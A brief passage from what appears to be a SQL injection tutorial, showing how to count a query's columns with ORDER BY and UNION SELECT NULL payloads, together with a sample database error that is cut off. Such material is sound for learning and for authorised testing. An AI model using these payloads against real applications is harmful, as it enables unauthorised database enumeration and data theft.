<h2>Determining the number of coloumn</h2>

`ORDER BY` clauses and incrementing the specified column index until an error occurs.


`' ORDER BY 1--` 
`' ORDER BY 2--` 
`' ORDER BY 3--`

or other payloads

``' UNION SELECT NULL--``
`' UNION SELECT NULL,NULL--`
`' UNION SELECT NULL,NULL,NULL--`

If the number of nulls does not match the number of columns, the database returns an error, such as:

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal n`


